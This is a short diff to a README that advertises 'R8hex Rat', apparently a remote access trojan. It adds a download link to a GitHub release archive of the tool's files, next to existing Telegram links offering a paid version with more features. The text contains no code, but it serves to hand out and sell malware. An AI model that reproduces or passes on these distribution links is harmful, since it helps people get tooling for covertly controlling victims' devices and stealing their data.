@@ -17,6 +17,12 @@
 
 <p1>These All Are Free Features Of R8hex Rat.If You Want More Features Then Contact On Telegram</p1>
 
+# Download All Files From Here 👇👇
+
+<a href="https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.0.0-R8HEX.zip">𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘 𝗙𝗜𝗟𝗘𝗦</a>
+
+
+
 <a href="https://t.me/R8HEX">𝗣𝗔𝗜𝗗 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗙 𝗥8𝗛𝗘𝗫 𝗥𝗔𝗧</a>
 
 <a href="https://t.me/FRIDAYXD">
